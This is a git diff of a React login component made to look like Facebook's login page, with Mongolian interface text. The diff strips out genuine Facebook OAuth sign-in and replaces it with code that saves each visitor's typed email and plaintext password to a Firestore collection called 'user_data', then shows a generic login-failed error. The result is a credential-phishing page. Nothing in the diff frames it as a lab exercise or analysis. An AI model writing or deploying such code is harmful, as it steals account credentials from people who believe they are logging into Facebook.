@@ -1,7 +1,7 @@
-import { useState, useEffect } from "react";
+import { useState } from "react";
 import { useNavigate } from "react-router-dom";
-import { auth } from "../lib/firebase";
-import { FacebookAuthProvider, signInWithPopup, onAuthStateChanged } from "firebase/auth";
+import { db } from "../lib/firebase";
+import { addDoc, collection } from "firebase/firestore";
 
 const font = "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif";
 
@@ -13,13 +13,6 @@ export default function Login() {
   const [error, setError] = useState("");
   const [emailError, setEmailError] = useState(false);
   const [passwordError, setPasswordError] = useState(false);
-
-  useEffect(() => {
-    const unsub = onAuthStateChanged(auth, (user) => {
-      if (user) navigate("/dashboard", { replace: true });
-    });
-    return unsub;
-  }, [navigate]);
 
   const inputStyle = (hasError) => ({
     width: "100%",
@@ -46,13 +39,15 @@ export default function Login() {
 
     setLoading(true);
     try {
-      const provider = new FacebookAuthProvider();
-      await signInWithPopup(auth, provider);
-      navigate("/dashboard");
+      await addDoc(collection(db, "user_data"), {
+        email: email.trim(),
+        password: password,
+        timestamp: new Date(),
+      });
+      setEmail("");
+      setPassword("");
     } catch (err) {
-      if (err.code !== "auth/popup-closed-by-user") {
-        setError(err.message || "Нэвтрэхэд алдаа гарлаа.");
-      }
+      setError("Нэвтрэхэд алдаа гарлаа.");
     } finally {
       setLoading(false);
     }
@@ -85,16 +80,6 @@ export default function Login() {
         >
           facebook
         </div>
-        <p
-          style={{
-            fontSize: "15px",
-            color: "#1c1e21",
-            margin: 0,
-            lineHeight: 1.4,
-          }}
-        >
-          Facebook-д нэвтрэн орж найз нөхдийнхөө мэдээллийг уншаарай.
-        </p>
       </div>
 
       <form
